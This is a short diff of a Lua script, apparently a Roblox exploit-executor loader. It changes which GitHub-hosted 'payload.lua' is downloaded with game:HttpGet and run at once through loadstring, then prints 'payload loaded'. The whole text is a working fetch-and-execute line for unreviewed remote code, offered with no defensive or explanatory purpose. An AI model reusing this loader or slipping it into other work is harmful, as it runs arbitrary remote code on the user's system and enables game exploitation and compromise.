@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-hydro/secret-host-haha/main/init_script.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/anyahubs/executer/main/payload.lua"))();
 wait(3)
 print("payload loaded")
 
